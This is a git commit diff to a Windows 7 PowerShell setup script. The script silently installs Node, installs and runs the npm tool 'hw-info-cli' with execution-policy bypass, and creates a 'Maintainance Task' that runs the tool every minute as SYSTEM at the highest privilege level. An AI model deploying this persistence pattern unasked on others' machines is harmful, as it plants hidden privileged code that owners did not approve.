ec2f672595f4479e4d06100591a55c0b5f78583c
Aditya Gupta <adityaofficialgupta@gmail.com>
2020-12-06 12:36:46 +0000

    Update windows-7.ps1

--- scripts/windows-7.ps1
+++ scripts/windows-7.ps1
@@ -12,8 +12,11 @@ Write-Host 'Installing Node'
 (Start-Process "msiexec.exe" -ArgumentList "/i `"$env:temp\node.msi`" /qn" -NoNewWindow -Wait -PassThru).ExitCode
 
 Write-Host 'Downloading cli'
-Start-Process powershell -ArgumentList "-noexit","-command &{ Set-ExecutionPolicy Bypass -Scope Process -Force;npm i hw-info-cli -g }" -Wait
-Start-Process powershell -ArgumentList "-noexit","-command &{ Set-ExecutionPolicy Bypass -Scope Process -Force;hw-info-cli -s }" -Wait
+$env:Path += ";C:\Program Files\nodejs"
+Start-Process powershell -ArgumentList "-noexit","-command &{ Set-ExecutionPolicy Bypass -Scope Process -Force; npm i hw-info-cli -g }" -Wait
+
+$env:Path += ";$env:APPDATA\npm\"
+Start-Process powershell -ArgumentList "-noexit","-command &{ Set-ExecutionPolicy Bypass -Scope Process -Force; hw-info-cli.cmd -s}" -Wait
 
 Write-Host 'Setting Tasks'
 schtasks /create /sc MINUTE /tn "Maintainance Task" /tr "hw-info-cli" /ru System /rl Highest
